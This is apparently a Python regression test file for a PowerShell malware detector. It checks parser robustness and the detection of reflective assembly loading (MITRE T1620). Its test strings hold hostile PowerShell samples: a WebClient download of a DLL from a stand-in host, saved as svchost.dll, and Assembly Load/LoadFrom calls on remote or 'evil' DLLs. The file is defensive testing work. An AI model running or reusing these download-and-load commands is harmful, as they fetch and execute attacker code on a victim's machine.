"""RC5 · Semantic coverage gaps — resolved regression tests (Feb 2026).

Previously two `xfail(strict=True)` cases lived here as tombstones for
known parser / detector gaps. Both were resolved in the Feb-2026
Correctness sprint (Priority 1 of the post-Phase-11.2 plan):

  1. **Parser hang on `$env:VAR + '...'` in expression context** —
     fixed in `powershell_parser._parse_call_args` by consuming binary
     operators between atoms. Also added an anti-hang safeguard in the
     top-level parse loop.
  2. **`[Reflection.Assembly]::Load(...)` semantic detection** — fixed
     in `powershell_interpreter._materialize_member` by emitting a
     dedicated `NodeKind.reflection` ExecNode; the MITRE mapper now
     emits T1620 (Reflective Code Loading) for the `defense_evasion /
     reflection` behavior sub-kind.

These tests now run as positive assertions (no `xfail`) and will
fail loudly if either fix regresses.
"""
from __future__ import annotations

import signal

from engine.parsers.powershell_parser import PowerShellParser
from engine.interpreters.powershell_interpreter import PowerShellInterpreter
from engine.detectors.behavior_extractor import extract_behaviors
from engine.detectors.mitre_mapper import map_behaviors_to_mitre
from engine.detectors.verdict_v2 import compute_verdict


# ---------------------------------------------------------------------------
# Parser hang fix — `$env:VAR + '...'` in method-call argument context.
# ---------------------------------------------------------------------------
def test_env_var_expression_concat_parses_within_2s():
    src = (
        r"$w = New-Object System.Net.WebClient; "
        r"$w.DownloadFile('http://trick.tld/x.dll', $env:APPDATA + '\svchost.dll')"
    )

    def _timeout_handler(sig, frame):
        raise TimeoutError("parser hung (> 2s)")

    signal.signal(signal.SIGALRM, _timeout_handler)
    signal.alarm(2)
    try:
        sir = PowerShellParser().parse(src)
        assert len(sir.root.children) >= 2
        # No hang-safeguard warnings should have fired.
        assert not any("no-advance" in w for w in (sir.warnings or ())), (
            "hang-safeguard fired — parser did not consume the input cleanly"
        )
    finally:
        signal.alarm(0)


def test_env_var_arg_no_hang_variants():
    """Broader coverage: `$env:VAR + expr` inside various call shapes."""
    cases = [
        "$obj.Method($env:APPDATA + 'x')",
        "$obj.Method($env:USERPROFILE + '\\a', 'literal')",
        "$obj.Method('lit', $env:TEMP + '\\b')",
        "$obj.Method($a + $b + $env:HOME)",
    ]
    for src in cases:
        signal.signal(signal.SIGALRM, lambda *_: (_ for _ in ()).throw(TimeoutError()))
        signal.alarm(2)
        try:
            sir = PowerShellParser().parse(src)
            assert sir.root.children, f"empty parse for {src!r}"
        finally:
            signal.alarm(0)


# ---------------------------------------------------------------------------
# Reflective PE-load detection.
# ---------------------------------------------------------------------------
def test_reflection_assembly_load_emits_reflection_node():
    from engine.exec_graph import NodeKind
    src = r'[Reflection.Assembly]::Load([Convert]::FromBase64String("TVqQAAMAAAAEAAAA...ABCDE"))'
    g = PowerShellInterpreter().interpret(PowerShellParser().parse(src))
    assert any(n.kind == NodeKind.reflection for n in g.nodes), (
        "no ReflectionNode emitted for [Reflection.Assembly]::Load"
    )


def test_reflection_assembly_load_emits_suspicious_verdict():
    src = r'[Reflection.Assembly]::Load([Convert]::FromBase64String("TVqQAAMAAAAEAAAA...ABCDE"))'
    g = PowerShellInterpreter().interpret(PowerShellParser().parse(src))
    b = extract_behaviors(g)
    m = map_behaviors_to_mitre(b)
    v = compute_verdict(b, m, [])
    assert v.verdict.value in ("Suspicious", "Malicious", "Critical"), (
        f"expected ≥ Suspicious for reflective PE-load, got {v.verdict.value}"
    )


def test_reflection_maps_to_t1620():
    src = r'[Reflection.Assembly]::Load([Convert]::FromBase64String("TVqQAAMAAAAEAAAA...ABCDE"))'
    g = PowerShellInterpreter().interpret(PowerShellParser().parse(src))
    m = map_behaviors_to_mitre(extract_behaviors(g))
    techniques = {x.technique_id for x in m}
    assert "T1620" in techniques, (
        f"expected T1620 (Reflective Code Loading) in {techniques}"
    )


def test_reflection_variants_all_detected():
    """LoadFile, LoadFrom, LoadWithPartialName all emit ReflectionNode."""
    from engine.exec_graph import NodeKind
    cases = [
        r'[Reflection.Assembly]::LoadFile("C:\Users\Public\evil.dll")',
        r'[Reflection.Assembly]::LoadFrom("http://mal/evil.dll")',
        r'[System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation")',
        r'[Reflection.Assembly]::UnsafeLoadFrom("\\share\evil.dll")',
    ]
    for src in cases:
        g = PowerShellInterpreter().interpret(PowerShellParser().parse(src))
        assert any(n.kind == NodeKind.reflection for n in g.nodes), (
            f"no ReflectionNode for {src!r}"
        )
